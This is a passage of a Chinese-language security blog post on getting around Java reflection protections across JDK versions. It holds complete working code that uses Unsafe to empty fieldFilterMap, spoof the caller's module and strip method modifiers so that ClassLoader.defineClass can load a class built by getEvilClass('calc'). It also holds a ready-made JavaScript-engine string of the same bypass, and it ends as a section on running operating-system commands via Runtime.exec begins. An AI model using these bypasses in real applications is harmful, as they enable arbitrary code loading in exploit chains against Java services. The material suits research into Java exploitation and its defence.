class="string">&quot;getDeclaredFields0&quot;</span>, <span class="type">boolean</span>.class);</span><br><span class="line">            <span class="comment">// 设置该方法可访问，因为它是私有方法</span></span><br><span class="line">            getDeclaredFields0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用 getDeclaredFields0 方法获取指定类的所有字段（包括私有字段，但不包括父类的字段）</span></span><br><span class="line">            Field[] fields = (Field[]) getDeclaredFields0.invoke(clazz, <span class="literal">false</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 遍历该类的字段数组，查找是否有匹配的字段</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldName.equals(field.getName())) &#123;</span><br><span class="line">                    <span class="comment">// 设置字段为可访问，以便后续可以修改或获取其值</span></span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> field; <span class="comment">// 返回找到的字段</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 发生异常时，抛出运行时异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 继续搜索父类中的字段，直到 clazz 为 null（即到达继承层级的顶端）</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果在所有继承层级中都未找到该字段，则返回 null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>JDK17 和高版本的 JDK16 的模块化系统的限制增强，导致上述方法中的 <code>getDeclaredFields0.setAccessible(true);</code> 会出现如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.RuntimeException: java.lang.reflect.InaccessibleObjectException: Unable to make private native java.lang.reflect.Field[] java.lang.Class.getDeclaredFields0(boolean) accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @3d075dc0</span><br><span class="line">	at com.example.Main.getDeclaredField(Main.java:44)</span><br><span class="line">	at com.example.Main.main(Main.java:70)</span><br><span class="line">Caused by: java.lang.reflect.InaccessibleObjectException: Unable to make private native java.lang.reflect.Field[] java.lang.Class.getDeclaredFields0(boolean) accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @3d075dc0</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:357)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class="line">	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199)</span><br><span class="line">	at java.base/java.lang.reflect.Method.setAccessible(Method.java:193)</span><br><span class="line">	at com.example.Main.getDeclaredField(Main.java:29)</span><br><span class="line">	... 1 more</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h5 id="置空-fieldFilterMap"><a href="#置空-fieldFilterMap" class="headerlink" title="置空 fieldFilterMap"></a>置空 fieldFilterMap</h5><p>另一种绕过方法是直接置空 <code>fieldFilterMap</code>，具体过程为：</p>
<ol>
<li><strong>读取 <code>Reflection.class</code> 字节码并创建匿名类。</strong></li>
</ol>
   <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; reflectionClass = Class.forName(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] classBuffer = reflectionClass.getResourceAsStream(<span class="string">&quot;Reflection.class&quot;</span>).readAllBytes();</span><br><span class="line">Class&lt;?&gt; reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>   因为 <code>fieldFilterMap</code> 过滤了 <code>Reflection</code> 的所有成员，无法直接使用 <code>getDeclaredField</code> 获取 <code>Field</code>。因此这里通过 <code>unsafe.defineAnonymousClass()</code> 方法，基于原始 <code>Reflection</code> 类字节码，动态创建一个<strong>匿名类</strong>，从而可以由此匿名类来获取类成员 <code>fieldFilterMap</code>。</p>
<ol start="2">
<li><p><strong>获取 <code>fieldFilterMap</code> 字段并置空。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">fieldFilterMap</span> <span class="operator">=</span> reflectionAnonymousClass.getDeclaredField(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fieldFilterMap.getType().isAssignableFrom(HashMap.class)) &#123;</span><br><span class="line">    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMap), <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>匿名类不受 <code>fieldFilterMap</code> 过滤，因此可以成功获取到原本无法访问的 <code>fieldFilterMap</code> 字段。之后检查字段类型是否为 <code>HashMap</code>，确保类型正确，并使用 <code>unsafe.putObject()</code> 将 <code>Reflection</code> 类中的静态字段 <code>fieldFilterMap</code> 替换为 <strong>新的空 <code>HashMap</code><strong>。这意味着反射 API 将</strong>不再过滤任何字段</strong>，从而<strong>绕过 Java 的反射安全机制</strong>。</p>
</li>
<li><p><strong>清除 <code>Class</code> 类的反射缓存。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] clz = Class.class.getResourceAsStream(<span class="string">&quot;Class.class&quot;</span>).readAllBytes();</span><br><span class="line">Class&lt;?&gt; classAnonymousClass = unsafe.defineAnonymousClass(Class.class, clz, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">reflectionData</span> <span class="operator">=</span> classAnonymousClass.getDeclaredField(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">unsafe.putObject(Class.class, unsafe.objectFieldOffset(reflectionData), <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>JVM 在第一次反射时，会将反射信息缓存到 <code>reflectionData</code> 中。如果不清除缓存，<code>fieldFilterMap</code> 的修改不会立即生效，反射仍然会受到旧的限制。我们可以参考前面从 <code>Reflection</code> 获取 <code>fieldFilterMap</code> 的方法从 <code>Class</code> 获取 <code>reflectionData</code> 字段并置为 <code>null</code>，<strong>强制 JVM 清空缓存</strong>，迫使其重新解析反射数据。清除缓存后，JVM 将重新读取并应用新的 <code>fieldFilterMap</code>，达到绕过限制的效果。</p>
</li>
</ol>
<p>完整代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassFieldFilterMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; reflectionClass = Class.forName(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] classBuffer = reflectionClass.getResourceAsStream(<span class="string">&quot;Reflection.class&quot;</span>).readAllBytes();</span><br><span class="line">    Class&lt;?&gt; reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">fieldFilterMap</span> <span class="operator">=</span> reflectionAnonymousClass.getDeclaredField(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMap.getType().isAssignableFrom(HashMap.class)) &#123;</span><br><span class="line">        unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMap), <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] clz = Class.class.getResourceAsStream(<span class="string">&quot;Class.class&quot;</span>).readAllBytes();</span><br><span class="line">    Class&lt;?&gt; classAnonymousClass = unsafe.defineAnonymousClass(Class.class, clz, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reflectionData</span> <span class="operator">=</span> classAnonymousClass.getDeclaredField(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">    unsafe.putObject(Class.class, unsafe.objectFieldOffset(reflectionData), <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>JS 版本：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">bypass</span> <span class="operator">=</span> <span class="string">&quot;var bypass = function()&#123;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var Unsafe = Java.type(&#x27;sun.misc.Unsafe&#x27;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var HashMap = Java.type(&#x27;java.util.HashMap&#x27;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var field = Unsafe.class.getDeclaredField(\&quot;theUnsafe\&quot;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;field.setAccessible(true);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var unsafe = field.get(null);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var classClass = Java.type(\&quot;java.lang.Class\&quot;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var reflectionClass = java.lang.Class.forName(\&quot;jdk.internal.reflect.Reflection\&quot;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var classBuffer = reflectionClass.getResourceAsStream(\&quot;Reflection.class\&quot;).readAllBytes();&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField(\&quot;fieldFilterMap\&quot;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;if (fieldFilterMapField.getType().isAssignableFrom(HashMap.class)) &#123;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), new HashMap());&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var clz = java.lang.Class.forName(\&quot;java.lang.Class\&quot;).getResourceAsStream(\&quot;Class.class\&quot;).readAllBytes();&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var ClassAnonymousClass = unsafe.defineAnonymousClass(java.lang.Class.forName(\&quot;java.lang.Class\&quot;), clz, null);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;var reflectionDataField = ClassAnonymousClass.getDeclaredField(\&quot;reflectionData\&quot;);&quot;</span> +</span><br><span class="line">    <span class="string">&quot;unsafe.putObject(classClass, unsafe.objectFieldOffset(reflectionDataField), null);&#125;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <ul>
<li>虽然 JDK11 把 <code>Unsafe#defineClass</code> 移除了，但 <code>Unsafe#defineAnonymousClass</code> 还在。</li>
<li><code>Unsafe#defineAnonymousClass</code> 在后续的 JDK 版本中被逐步移除：<ul>
<li><strong>JDK 15</strong> ：<code>defineAnonymousClass</code> 方法被弃用，并标记为将在未来版本中移除。</li>
<li><strong>JDK 16</strong> ：该方法被进一步标记为“将来移除”。 </li>
<li><strong>JDK 17</strong> ：<code>defineAnonymousClass</code> 方法被正式移除。</li>
</ul>
</li>
</ul>

    </div>
  </div>

<h3 id="JDK-≥-17"><a href="#JDK-≥-17" class="headerlink" title="JDK ≥ 17"></a>JDK ≥ 17</h3><p>JDK17（以及高版本的 JDK16）针对 <code>checkCanSetAccessible</code> 的限制进一步增强。</p>
<h4 id="限制条件分析-2"><a href="#限制条件分析-2" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p>前面提到从 JDK9 版本起，开始出现针对  <code>checkCanSetAccessible</code> 方法的限制，但是多数情况下 <code>checkCanSetAccessible</code> 函数最后的 <code>declaringModule.isOpen</code> 还只是报警告错误。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果被反射类的包是对调用者开放的，返回 true</span></span><br><span class="line"><span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">    logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然而 JDK17 版本起 <code>declaringModule.isOpen(pn, callerModule)</code> 不再返回 <code>true</code>，导致一些之前运行的反射操作变得不再允许。</p>
<p>至于这个方法为何返回 <code>true</code>，由于 <code>declaringModule.isOpen</code> 有着复杂的逻辑判断，并且与我们如何绕过并没有什么关系，因此这里我们并不关心。</p>
<h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>前面在 JDK9 版本时我们已经提出了一个针对 <code>checkCanSetAccessible</code> 的绕过方法。然而这个方法需要我们修改被反射操作的对象成员的 <code>modifer</code> 属性，而到 JDK17 版本时获取属性的的绕过方法均已失效（其中的 <code>getDeclaredFields0</code> 在 <code>setAccessible</code> 时同样被禁止了），因此这一方法同样也就失效了。</p>
<p>不过 <code>checkCanSetAccessible</code> 方法中还判断了很多条件，我们只要想办法让其中一个条件得到满足就能绕过。</p>
<p>由于 <code>fieldFilterMap</code> 没有过滤 <code>Class</code> 的 <code>module</code>成员，因此一种常见的方法就是通过 <code>Unsafe</code> 修改当前调用者的模块为 <code>Object</code> 所在模块，这样就可以通过下面这条判断。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set by VM</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Module <span class="keyword">module</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回此类或接口所属的模块。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果此类表示一个数组类型，则此方法返回该元素类型的 &#123;<span class="doctag">@code</span> Module&#125;。</span></span><br><span class="line"><span class="comment"> * 如果此类表示一个原始类型或 void，则返回 &#123;<span class="doctag">@code</span> java.base&#125; 模块的 &#123;<span class="doctag">@code</span> Module&#125; 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果此类位于一个未命名的模块中，则返回该类加载器的 &#123;<span class="doctag">@linkplain</span></span></span><br><span class="line"><span class="comment"> * ClassLoader#getUnnamedModule() 未命名模块&#125; &#123;<span class="doctag">@code</span> Module&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回此类或接口所属的模块</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 9</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@spec</span> JPMS</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Module <span class="title function_">getModule</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checkCanSetAccessible</span></span><br><span class="line"><span class="keyword">if</span> (callerModule == Object.class.getModule()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></div>

<p>我们可以对前面的 <code>getDeclaredField</code> 方法进一步作如下改进：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取指定类及其父类中的声明字段（包括私有字段）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 需要查找的字段名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果找到指定名称的字段，则返回该字段对象；否则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Module</span> <span class="variable">objModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">    <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">    unsafe.getAndSetObject(Class.forName(Thread.currentThread().getStackTrace()[<span class="number">1</span>].getClassName()), addr, objModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历当前类及其所有父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取 Class 类的私有方法 getDeclaredFields0</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeclaredFields0</span> <span class="operator">=</span> Class.class.getDeclaredMethod(<span class="string">&quot;getDeclaredFields0&quot;</span>, <span class="type">boolean</span>.class);</span><br><span class="line">            <span class="comment">// 设置该方法可访问，因为它是私有方法</span></span><br><span class="line">            getDeclaredFields0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 调用 getDeclaredFields0 方法获取指定类的所有字段（包括私有字段，但不包括父类的字段）</span></span><br><span class="line">            Field[] fields = (Field[]) getDeclaredFields0.invoke(clazz, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历该类的字段数组，查找是否有匹配的字段</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldName.equals(field.getName())) &#123;</span><br><span class="line">                    <span class="comment">// 设置字段为可访问，以便后续可以修改或获取其值</span></span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> field; <span class="comment">// 返回找到的字段</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 发生异常时，抛出运行时异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 继续搜索父类中的字段，直到 clazz 为 null（即到达继承层级的顶端）</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果在所有继承层级中都未找到该字段，则返回 null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>由于我们无法直接调用 <code>Reflection</code> 的 <code>getCallerClass</code> 方法（因为此时 <code>setAccessible</code> 还没有被绕过），因此这里我通过 <code>Class.forName(Thread.currentThread().getStackTrace()[1].getClassName())</code> 来获取调用者对应的 <code>Class</code> 对象。</p>
<p>其中 <code>Thread.currentThread().getStackTrace()</code> 获取了当前线程的调用栈，返回结果是一个数组表示调用栈中的所有方法。</p>
<p>需要注意的是 <code>getStackTrace()</code> 返回的堆栈是反向的，第一个元素是当前方法（即调用 <code>getStackTrace</code> 的方法），所以调用栈的第一个元素是当前方法，第二个元素才是调用 <code>getStackTrace</code> 方法的上一个方法。</p>
<p>我们通过 <code>getClassName</code> 获取调用 <code>getStackTrace</code> 方法的上一个方法对应的类名，然后再使用 <code>Class.forName</code> 获取对应的 <code>Class</code> 对象</p>

    </div>
  </div>

<p>借助改进后的 <code>getDeclaredField</code> 我们成功的获取并修改了 <code>defineClass</code> 对应 <code>Method</code> 的 <code>Class</code> 对象的 <code>modifiers</code> 属性。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(defineClassMethod.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), (<span class="type">short</span>) Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; aClass = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">aClass.newInstance();</span><br></pre></td></tr></table></figure></div>

<p>另外我们还可以用修改 <code>final</code> 变量的思路代替 <code>Unsafe</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getDeclaredField(object.getClass(), fieldName);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(field.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">setFieldValue(defineClassMethod, <span class="string">&quot;modifiers&quot;</span>, Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; aClass = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">aClass.newInstance();</span><br></pre></td></tr></table></figure></div>

<h2 id="反射执行命令"><a href="#反射执行命令" class="headerlink" title="反射执行命令"></a>反射执行命令</h2><p>在 Java 中，我们可以使用 <code>Runtime.getRuntime()</code> 和 <code>ProcessBuilder</code> 来执行外部命令（例如操作系统命令或运行其他程序）。</p>
<h3 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h3><p><code>java.lang.Runtime</code> 是一个与 Java 虚拟机（JVM）交互的接口，它提供了一些方法来执行外部命令和管理系统资源。其中 <code>exec</code> 方法是执行外部命令的主要方法。它会启动一个新的进程来执行指定的命令。</p>
<p><code>java.lang.Runtime</code> 执行命令需要先获取 <code>Runtime</code> 对象。由于 <code>Runtime</code> 是单例模式，因此需要调用 <code>Runtime</code> 的 <code>getRuntime</code> 方法来获取。之后调用 <code>Runtime</code> 对象的 <code>exec</code> 方法执行命令。对应 <code>java</code> 语句如下：</p>
